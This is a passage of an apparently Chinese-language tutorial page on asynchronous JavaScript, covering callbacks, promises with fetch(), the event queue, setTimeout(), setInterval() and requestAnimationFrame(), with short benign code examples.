等等。</p><p>请注意，不是所有的回调函数都是异步的 — <strong>有一些是同步的</strong>。一个例子就是使用 <code>Array.prototype.forEach()</code>来遍历数组:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> gods = [<span class="string">&#x27;Apollo&#x27;</span>, <span class="string">&#x27;Artemis&#x27;</span>, <span class="string">&#x27;Ares&#x27;</span>, <span class="string">&#x27;Zeus&#x27;</span>];</span><br><span class="line"></span><br><span class="line">gods.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">eachName, index</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(index + <span class="string">&#x27;. &#x27;</span> + eachName);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这个例子中，我们遍历一个希腊神的数组，并在控制台中打印索引和值。<code>forEach()</code> 需要的参数是一个回调函数，回调函数本身带有两个参数，数组元素和索引值。它无需等待任何事情，立即运行。</p><h2 id="Promises"><a href="#Promises" class="headerlink" title="Promises"></a>Promises</h2><p>Promises 是新派的异步代码，现代的web APIs经常用到。 <code>fetch()</code> API就是一个很好的例子, 它基本上就是一个现代版的，更高效的 <code>XMLHttpRequest</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;products.json&#x27;</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> response.json();</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">json</span>) </span>&#123;</span><br><span class="line">  products = json;</span><br><span class="line">  initialize();</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Fetch problem: &#x27;</span> + err.message);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里<code>fetch()</code> 只需要一个参数— 资源的网络 URL — 返回一个promise。promise 是表示异步操作完成或失败的对象。可以说，它代表了一种中间状态。 本质上，这是浏览器说“我保证尽快给您答复”的方式，因此得名“promise”。</p><p>这个概念需要练习来适应;它感觉有点像运行中的薛定谔猫。这两种可能的结果都还没有发生，因此fetch操作目前正在等待浏览器试图在将来某个时候完成该操作的结果。然后我们有三个代码块链接到fetch()的末尾：</p><ul><li>两个 <code>then()</code> 块。两者都包含一个回调函数，如果前一个操作成功，该函数将运行，并且每个回调都接收前一个成功操作的结果作为输入，因此您可以继续对它执行其他操作。每个 <code>.then()</code>块返回另一个promise，这意味着可以将多个<code>.then()</code>块链接到另一个块上，这样就可以依次执行多个异步操作。</li><li>如果其中任何一个<code>then()</code>块失败，则在末尾运行<code>catch()</code>块——与同步<code>try...catch</code>类似，<code>catch()</code>提供了一个错误对象，可用来报告发生的错误类型。但是请注意，同步<code>try...catch</code>不能与promise一起工作，尽管它可以与<code>async/await</code>一起工作，稍后您将了解到这一点。</li></ul><h3 id="事件队列"><a href="#事件队列" class="headerlink" title="事件队列"></a>事件队列</h3><p>像promise这样的异步操作被放入事件队列中，事件队列在主线程完成处理后运行，这样它们就不会阻止后续JavaScript代码的运行。排队操作将尽快完成，然后将结果返回到JavaScript环境。</p><h3 id="Promises-对比-callbacks"><a href="#Promises-对比-callbacks" class="headerlink" title="Promises 对比 callbacks"></a>Promises 对比 callbacks</h3><p>promises与旧式callbacks有一些相似之处。它们本质上是一个返回的对象，您可以将回调函数附加到该对象上，而不必将回调作为参数传递给另一个函数。</p><p>然而，<code>Promise</code>是专门为异步操作而设计的，与旧式回调相比具有许多优点:</p><ul><li>您可以<strong>使用多个then()操作将多个异步操作链接在一起，并将其中一个操作的结果作为输入传递给下一个操作</strong>。这种链接方式对回调来说要难得多，会使回调以混乱的“末日金字塔”告终。 (也称为<strong>回调地狱</strong>)。</li><li><code>Promise</code>总是严格按照它们放置在事件队列中的<strong>顺序调用</strong>。</li><li>错误处理要好得多——所有的错误都由块末尾的一个<code>.catch()</code>块处理，而不是在“金字塔”的每一层单独处理。</li></ul><h2 id="异步代码的本质"><a href="#异步代码的本质" class="headerlink" title="异步代码的本质"></a>异步代码的本质</h2><p>让我们研究一个示例，它进一步说明了异步代码的本质，展示了当我们不完全了解代码执行顺序以及将异步代码视为同步代码时可能发生的问题。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log (<span class="string">&#x27;Starting&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> image;</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&#x27;coffee.jpg&#x27;</span>).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;It worked :)&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> response.blob();</span><br><span class="line">&#125;).then(<span class="function">(<span class="params">myBlob</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> objectURL = URL.createObjectURL(myBlob);</span><br><span class="line">  image = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  image.src = objectURL;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(image);</span><br><span class="line">&#125;).catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;There has been a problem with your fetch operation: &#x27;</span> + error.message);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log (<span class="string">&#x27;All done!&#x27;</span>);</span><br></pre></td></tr></table></figure><p>浏览器将会执行代码，看见第一个<code>console.log()</code> 输出(<code>Starting</code>) ，然后创建<code>image</code> 变量。</p><p>然后，它将移动到下一行并开始执行<code>fetch()</code>块，但是，因为<code>fetch()</code>是异步执行的，没有阻塞，所以在<code>promise</code>相关代码之后程序继续执行，从而到达最后的<code>console.log()</code>语句(<code>All done</code>!)并将其输出到控制台。</p><p>只有当<code>fetch()</code> 块完成运行返回结果给<code>.then()</code> ，我们才最后看到第二个<code>console.log()</code> 消息 (<code>It worked ;)</code>) . 所以 这些消息可能以和你预期不同的顺序出现：</p><ul><li><code>Starting</code></li><li><code>All done!</code></li><li><code>It worked :)</code></li></ul><p>如果你感到疑惑，考虑下面这个小例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;registering click handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">button.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;get click&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;all done&quot;</span>);</span><br></pre></td></tr></table></figure><p>这在行为上非常相似——第一个和第三个<code>console.log()</code>消息将立即显示，但是第二个消息将被阻塞，直到有人单击鼠标按钮。前面的示例以相同的方式工作，只是在这种情况下，第二个消息在<code>promise</code>链上被阻塞，直到获取资源后再显示在屏幕上，而不是单击。</p><p>将第三个<code>console.log()</code>调用更改为以下命令：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log (<span class="string">&#x27;All done! &#x27;</span> + image.src + <span class="string">&#x27;displayed.&#x27;</span>);</span><br></pre></td></tr></table></figure><p>此时控制台将会报错，而不会显示第三个 <code>console.log</code> 的信息：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">TypeError</span>: image is <span class="literal">undefined</span>; can<span class="string">&#x27;t access its &quot;src&quot; property</span></span><br></pre></td></tr></table></figure><p>这是因为：浏览器运行第三个<code>console.log()</code>的时候，<code>fetch()</code> 语句块还没有完成，因此<code>image</code>还没有赋值。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在最基本的形式中，<strong>JavaScript是一种同步的、阻塞的、单线程的语言</strong>，在这种语言中，一次只能执行一个操作。但web浏览器定义了函数和API，允许我们当某些事件发生时不是按照同步方式，而是<strong>异步地调用函数</strong>(比如，时间的推移，用户通过鼠标的交互，或者获取网络数据)。这意味着您的代码可以同时做几件事情，而不需要停止或阻塞主线程。</p><p>异步还是同步执行代码，取决于我们要做什么。</p><p>有些时候，我们希望事情能够立即加载并发生。例如，当将一些用户定义的样式应用到一个页面时，您希望这些样式能够尽快被应用。</p><p>但是，如果我们正在运行一个需要时间的操作，比如查询数据库并使用结果填充模板，那么最好将该操作从主线程中移开使用异步完成任务。随着时间的推移，您将了解何时选择异步技术比选择同步技术更有意义。</p><h1 id="setTimeout-amp-setInterval"><a href="#setTimeout-amp-setInterval" class="headerlink" title="setTimeout() &amp; setInterval()"></a>setTimeout() &amp; setInterval()</h1><p>很长一段时间以来，web平台为JavaScript程序员提供了许多函数，这些函数允许您在一段时间间隔过后异步执行代码，或者重复异步执行代码块，直到您告诉它停止为止。这些都是:</p><ul><li><p><code>setTimeout()</code></p><p>在指定的时间后执行一段代码.</p></li><li><p><code>setInterval()</code></p><p>以固定的时间间隔，重复运行一段代码.</p></li><li><p><code>requestAnimationFrame()</code></p><p>setInterval()的现代版本;在浏览器下一次重新绘制显示之前执行指定的代码块，从而允许动画在适当的帧率下运行，而不管它在什么环境中运行.</p></li></ul><p>这些函数设置的异步代码实际上在<strong>主线程</strong>上运行（在其指定的计时器过去之后）。</p><p>在 <code>setTimeout()</code> 调用执行之前或 <code>setInterval()</code> 迭代之间可以（并且经常会）运行其他代码。根据这些操作的处理器密集程度，它们可以进一步延迟异步代码，<strong>因为任何异步代码仅在主线程可用后才执行（换句话说，当调用栈为空时）</strong>。</p><p>无论如何，这些函数用于在web站点或应用程序上运行不间断的动画和其他后台处理。</p><h2 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout()"></a>setTimeout()</h2><p>正如前述， <code>setTimeout()</code> 在指定的时间后执行一段特定代码. 它需要如下参数:</p><ul><li>要运行的函数，或者函数引用。</li><li>表示在执行代码之前等待的时间间隔(以<strong>毫秒</strong>为单位，所以1000等于1秒)的数字。如果指定值为0(或完全省略该值)，函数将<strong>尽快</strong>运行。</li><li>更多的参数：在指定函数运行时，希望传递给函数的值。</li></ul><p><strong>Note:</strong> <strong>指定的时间（或延迟）不能保证在指定的确切时间之后执行，而是最短的延迟执行时间</strong>。<strong>在主线程上的堆栈为空之前，传递给这些函数的回调将无法运行。</strong></p><p>结果，像 <code>setTimeout(fn, 0)</code> 这样的代码将在堆栈为空时立即执行，而不是立即执行。如果执行类似 <code>setTimeout(fn, 0)</code> 之类的代码，之后立即运行从 1 到 100亿 的循环之后，回调将在几秒后执行。 </p><p>在下面的示例中，浏览器将在执行匿名函数之前等待两秒钟，然后显示alert消息:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myGreeting = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">&#x27;Hello, Mr. Universe!&#x27;</span>);</span><br><span class="line">&#125;, <span class="number">2000</span>)</span><br></pre></td></tr></table></figure><p>我们指定的函数不必是匿名的。我们可以给函数一个名称，甚至可以在其他地方定义它，并将函数引用传递给 <code>setTimeout()</code> 。以下两个版本的代码片段相当于第一个版本:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// With a named function</span></span><br><span class="line"><span class="keyword">let</span> myGreeting = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">&#x27;Hello, Mr. Universe!&#x27;</span>);</span><br><span class="line">&#125;, <span class="number">2000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// With a function defined separately</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">&#x27;Hello Mr. Universe!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myGreeting = <span class="built_in">setTimeout</span>(sayHi, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure><p>例如，如果我们有一个函数既需要从超时调用，也需要响应某个事件，那么这将非常有用。此外它也可以帮助保持代码整洁，特别是当超时回调超过几行代码时。</p><p><code>setTimeout()</code> 返回一个标志符变量用来引用这个间隔，可以稍后用来取消这个超时任务。</p><h3 id="传递参数给setTimeout"><a href="#传递参数给setTimeout" class="headerlink" title="传递参数给setTimeout()"></a>传递参数给setTimeout()</h3><p>我们希望传递给<code>setTimeout()</code>中运行的函数的任何参数，都必须作为列表末尾的附加参数传递给它。</p><p>例如，我们可以重构之前的函数，这样无论传递给它的人的名字是什么，它都会向它打招呼：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params">who</span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">&#x27;Hello &#x27;</span> + who + <span class="string">&#x27;!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>人名可以通过第三个参数传进 <code>setTimeout()</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let myGreeting = setTimeout(sayHi, 2000, &#x27;Mr. Universe&#x27;);</span><br></pre></td></tr></table></figure><h3 id="清除超时"><a href="#清除超时" class="headerlink" title="清除超时"></a>清除超时</h3><p>最后，如果创建了 timeout，您可以通过调用<code>clearTimeout()</code>，将<code>setTimeout()</code>调用的标识符作为参数传递给它，从而在超时运行之前取消。要取消上面的超时，你需要这样做：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">clearTimeout</span>(myGreeting);</span><br></pre></td></tr></table></figure><h2 id="setInterval"><a href="#setInterval" class="headerlink" title="setInterval()"></a>setInterval()</h2><p>当我们需要在一段时间之后运行一次代码时，<code>setTimeout()</code>可以很好地工作。但是当我们需要反复运行代码时会发生什么，例如在动画的情况下?</p><p>这就是<code>setInterval()</code>的作用所在。这与<code>setTimeout()</code>的工作方式非常相似，只是作为第一个参数传递给它的函数，<strong>重复</strong>执行的时间不少于第二个参数给出的毫秒数，<strong>而不是一次执行</strong>。您还可以将正在执行的函数所需的任何参数作为 <code>setInterval()</code> 调用的后续参数传递。</p><p>让我们看一个例子。下面的函数创建一个新的<code>Date()</code>对象，使用<code>toLocaleTimeString()</code>从中提取一个时间字符串，然后在UI中显示它。然后，我们使用<code>setInterval()</code>每秒运行该函数一次，创建一个每秒更新一次的数字时钟的效果。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">displayTime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">let</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">   <span class="keyword">let</span> time = date.toLocaleTimeString();</span><br><span class="line">   <span class="built_in">document</span>.getElementById(<span class="string">&#x27;demo&#x27;</span>).textContent = time;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> createClock = <span class="built_in">setInterval</span>(displayTime, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>像<code>setTimeout()</code>一样, <code>setInterval()</code> 返回一个确定的值，稍后你可以用它来<strong>取消间隔任务</strong>。</p><h3 id="清除intervals"><a href="#清除intervals" class="headerlink" title="清除intervals"></a>清除intervals</h3><p><code>setInterval()</code>永远保持运行任务,除非我们做点什么——我们可能会想阻止这样的任务,否则当浏览器无法完成任何进一步的任务时我们可能得到错误, 或者动画处理已经完成了。我们可以用与停止超时相同的方法来实现这一点——通过将<code>setInterval()</code>调用返回的标识符传递给<code>clearInterval()</code>函数:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> myInterval = <span class="built_in">setInterval</span>(myFunction, <span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">clearInterval</span>(myInterval);</span><br></pre></td></tr></table></figure><h2 id="关于-setTimeout-和-setInterval-需要注意的几点"><a href="#关于-setTimeout-和-setInterval-需要注意的几点" class="headerlink" title="关于 setTimeout() 和 setInterval() 需要注意的几点"></a>关于 setTimeout() 和 setInterval() 需要注意的几点</h2><p>当使用 <code>setTimeout()</code> 和 <code>setInterval()</code>的时候，有几点需要额外注意。 现在让我们回顾一下：</p><h3 id="递归的timeouts"><a href="#递归的timeouts" class="headerlink" title="递归的timeouts"></a>递归的timeouts</h3><p>还有另一种方法可以使用<code>setTimeout()</code>：我们可以递归调用它来重复运行相同的代码，而不是使用<code>setInterval()</code>。</p><p>下面的示例使用递归<code>setTimeout()</code>每100毫秒运行传递来的函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">  i++;</span><br><span class="line">  <span class="built_in">setTimeout</span>(run, <span class="number">100</span>);</span><br><span class="line">&#125;, <span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>将上面的示例与下面的示例进行比较 ––这使用 <code>setInterval()</code> 来实现相同的效果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">  i++</span><br><span class="line">&#125;, <span class="number">100</span>);</span><br></pre></td></tr></table></figure><h4 id="递归setTimeout-和setInterval-有何不同？"><a href="#递归setTimeout-和setInterval-有何不同？" class="headerlink" title="递归setTimeout()和setInterval()有何不同？"></a>递归setTimeout()和setInterval()有何不同？</h4><p>上述代码的两个版本之间的差异是微妙的。</p><ul><li>递归 <code>setTimeout()</code> 保证执行之间的延迟相同，例如在上述情况下为100ms。 代码将运行，然后在它再次运行之前等待100ms，因此无论代码运行多长时间，间隔都是相同的。</li><li>使用 <code>setInterval()</code> 的示例有些不同。 <strong>我们选择的间隔包括执行我们想要运行的代码所花费的时间</strong>。假设代码需要40毫秒才能运行 - 然后间隔最终只有60毫秒。</li><li>当递归使用 <code>setTimeout()</code> 时，每次迭代都可以在运行下一次迭代之前计算不同的延迟。 换句话说，第二个参数的值可以指定在再次运行代码之前等待的不同时间（以毫秒为单位）。</li></ul><p>当你的代码有可能比你分配的时间间隔，花费更长时间运行时，最好使用递归的 <code>setTimeout()</code> - 这将使执行之间的时间间隔保持不变，无论代码执行多长时间，你不会得到错误。</p><h3 id="立即超时"><a href="#立即超时" class="headerlink" title="立即超时"></a>立即超时</h3><p>使用0用作setTimeout()的回调函数会立刻执行，但是在主线程代码运行之后执行。</p><p>举个例子，下面的代码输出一个包含警报的”Hello”，然后在您点击第一个警报的OK之后立即弹出“world”。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">&#x27;World&#x27;</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">alert(<span class="string">&#x27;Hello&#x27;</span>);</span><br></pre></td></tr></table></figure><p>如果您希望设置一个代码块以便在所有主线程完成运行后立即运行，这将很有用。将其放在异步事件循环中，这样它将随后直接运行。</p><h3 id="使用-clearTimeout-or-clearInterval-清除"><a href="#使用-clearTimeout-or-clearInterval-清除" class="headerlink" title="使用 clearTimeout() or clearInterval()清除"></a>使用 clearTimeout() or clearInterval()清除</h3><p><code>clearTimeout()</code>和<code>clearInterval()</code>都使用相同的条目列表进行清除。有趣的是，这意味着你可以使用任一一种方法来清除<code>setTimeout()</code>和<code>setInterval()</code>。</p><p>但为了保持一致性，你应该使用 <code>clearTimeout()</code> 来清除 <code>setTimeout()</code> 条目，使用 <code>clearInterval()</code> 来清除 <code>setInterval()</code> 条目。 这样有助于避免混乱。</p><h2 id="requestAnimationFrame"><a href="#requestAnimationFrame" class="headerlink" title="requestAnimationFrame()"></a>requestAnimationFrame()</h2><p><code>requestAnimationFrame()</code> 是一个专门的循环函数，旨在浏览器中高效运行动画。它基本上是现代版本的<code>setInterval()</code> —— 它在浏览器重新加载显示内容之前执行指定的代码块，从而允许动画以适当的帧速率运行，不管其运行的环境如何。</p><p>它是针对<code>setInterval()</code> 遇到的问题创建的，比如 <code>setInterval()</code>并不是针对设备优化的帧率运行，有时会丢帧。还有即使该选项卡不是活动的选项卡或动画滚出页面等问题 。</p><p>该方法将重新加载页面之前要调用的回调函数作为参数。这是您将看到的常见表达：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="comment">// Drawing code goes here</span></span><br><span class="line">   requestAnimationFrame(draw);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">draw();</span><br></pre></td></tr></table></figure><p>这个想法是要定义一个函数，在其中更新动画 (例如，移动精灵，更新乐谱，刷新数据等)，然后调用它来开始这个过程。在函数的末尾，以 <code>requestAnimationFrame()</code> 传递的函数作为参数进行调用，这指示浏览器在下一次显示重新绘制时再次调用该函数。然后这个操作连续运行， 因为<code>requestAnimationFrame()</code> 是递归调用的。</p><p><strong>注意</strong>: 如果要执行某种简单的常规DOM动画, <strong>CSS 动画</strong>可能更快，因为它们是由浏览器的内部代码计算而不是JavaScript直接计算的。但是，如果您正在做一些<strong>更复杂</strong>的事情，并且<strong>涉及到在DOM中不能直接访问的对象</strong>, <code>requestAnimationFrame()</code> 在大多数情况下是更好的选择。</p><h3 id="你的动画跑得有多快？"><a href="#你的动画跑得有多快？" class="headerlink" title="你的动画跑得有多快？"></a>你的动画跑得有多快？</h3><p>动画的平滑度直接取决于动画的帧速率，并以每秒帧数（fps）为单位进行测量。这个数字越高，动画看起来就越平滑。</p><p>由于大多数屏幕的刷新率为60Hz，因此在使用web浏览器时，可以达到的最快帧速率是每秒60帧（FPS）。然而，更多的帧意味着更多的处理，这通常会导致卡顿和跳跃-也称为丢帧或跳帧。</p><p>如果您有一个刷新率为60Hz的显示器，并且希望达到60fps，则大约有16.7毫秒（1000/60）来执行动画代码来渲染每个帧。这提醒我们，我们需要注意每次通过动画循环时要运行的代码量。</p><p><code>requestAnimationFrame()</code> 总是试图尽可能接近60帧/秒的值，当然有时这是不可能的如果你有一个非常复杂的动画，你是在一个缓慢的计算机上运行它，你的帧速率将更少。<code>requestAnimationFrame()</code> 会尽其所能利用现有资源提升帧速率。</p><h3 id="requestAnimationFrame-与-setInterval-和-setTimeout-有什么不同"><a href="#requestAnimationFrame-与-setInterval-和-setTimeout-有什么不同" class="headerlink" title="requestAnimationFrame() 与 setInterval() 和 setTimeout()有什么不同?"></a>requestAnimationFrame() 与 setInterval() 和 setTimeout()有什么不同?</h3><p>让我们进一步讨论一下 <code>requestAnimationFrame()</code> 方法与前面介绍的其他方法的区别. 下面让我们看一下代码:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="comment">// Drawing code goes here</span></span><br><span class="line">   requestAnimationFrame(draw);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">draw();</span><br></pre></td></tr></table></figure><p>现在让我们看看如何使用<code>setInterval()</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="comment">// Drawing code goes here</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(draw, <span class="number">17</span>);</span><br></pre></td></tr></table></figure><p>如前所述，我们没有为<code>requestAnimationFrame()</code>;指定<strong>时间间隔</strong>；它只是在当前条件下尽可能快速平稳地运行它。如果动画由于某些原因而处于屏幕外浏览器也不会浪费时间运行它。</p><p> 另一方面<code>setInterval()</code>需要指定间隔。我们通过公式1000毫秒/60Hz得出17的最终值，然后将其四舍五入。四舍五入是一个好主意，浏览器可能会尝试运行动画的速度超过60fps，它不会对动画的平滑度有任何影响。如前所述，60Hz是标准刷新率。</p><h3 id="包括时间戳"><a href="#包括时间戳" class="headerlink" title="包括时间戳"></a>包括时间戳</h3><p>传递给 <code>requestAnimationFrame()</code> 函数的实际回调也可以被赋予一个参数（一个时间戳值），表示自 <code>requestAnimationFrame()</code> 开始运行以来的时间。这是很有用的，因为它允许您在特定的时间以恒定的速度运行，而不管您的设备有多快或多慢。您将使用的一般模式如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> startTime = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params">timestamp</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!startTime) &#123;</span><br><span class="line">      startTime = timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   currentTime = timestamp - startTime;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Do something based on current time</span></span><br><span class="line"></span><br><span class="line">   requestAnimationFrame(draw);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">draw();</span><br></pre></td></tr></table></figure><h3 id="浏览器支持"><a href="#浏览器支持" class="headerlink" title="浏览器支持"></a>浏览器支持</h3><p> 与<code>setInterval()</code>或<code>setTimeout()</code> 相比最近的浏览器支持<code>requestAnimationFrame()</code></p><p>— <code>requestAnimationFrame()</code>.在Internet Explorer 10及更高版本中可用。因此，除非您的代码需要支持旧版本的IE，否则没有什么理由不使用<code>requestAnimationFrame()</code> 。</p><h3 id="撤销requestAnimationFrame"><a href="#撤销requestAnimationFrame" class="headerlink" title="撤销requestAnimationFrame()"></a>撤销requestAnimationFrame()</h3><p><code>requestAnimationFrame()</code>可用与之对应的<code>cancelAnimationFrame()</code>方法“撤销”。</p><p>该方法以<code>requestAnimationFrame()</code>的返回值为参数，此处我们将该返回值存在变量 <code>rAF</code> 中：</p><figure class="highlight js"><table><tr><td 